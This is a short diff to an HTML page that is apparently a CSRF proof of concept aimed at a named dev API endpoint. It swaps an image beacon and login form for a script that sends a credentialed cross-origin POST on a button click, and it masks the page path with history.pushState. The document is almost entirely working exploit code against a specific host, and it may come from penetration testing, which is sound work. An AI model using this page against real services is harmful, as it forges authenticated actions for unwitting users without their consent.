@@ -1,11 +1,23 @@
 <html>
   <body>
-   <form action="https://ca.d2.epam-dev.genosity.com/api/manual_load/get/qweqwe">
-   <p><input name="login"> <input type="password" name="pass"></p>
-   <p><input type="submit"></p>
-  </form>
+  <script>history.pushState('', '', '/')</script>
     <script>
-	    new Image().src='https://ca.d2.epam-dev.genosity.com/api/manual_load/get/qweqwe';
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/ca.d2.epam-dev.genosity.com\/api\/manual_load\/get\/qweqwe", true);
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
     </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
   </body>
 </html>
